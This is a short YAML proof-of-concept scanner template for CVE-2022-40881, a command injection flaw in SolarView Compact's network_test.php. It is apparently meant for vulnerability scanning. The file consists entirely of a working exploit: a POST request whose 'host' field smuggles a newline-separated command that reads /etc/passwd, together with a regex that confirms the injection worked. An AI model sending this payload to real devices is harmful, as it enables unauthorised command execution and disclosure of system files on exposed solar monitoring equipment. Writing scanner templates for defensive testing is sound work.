name: poc-yaml-solarview-compact-cve-2022-40881-php-rce
binding: 4b8de98e-ec6a-4056-8022-ab5f88dd33c5
manual: true
detail:
    author: https://github.com/Canv3
    links:
        - https://github.com/Timorlover/SolarView_Compact_6.0_rce_via_network_test.php
    vulnerability:
        level: critical
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /network_test.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: host=host=%0acat${IFS}/etc/passwd%0a&command=ping
        expression: response.status == 200 && "root:[^:]*:[0-9]*:[0-9]*:[^:]*".bmatches(response.body)
expression: r0()
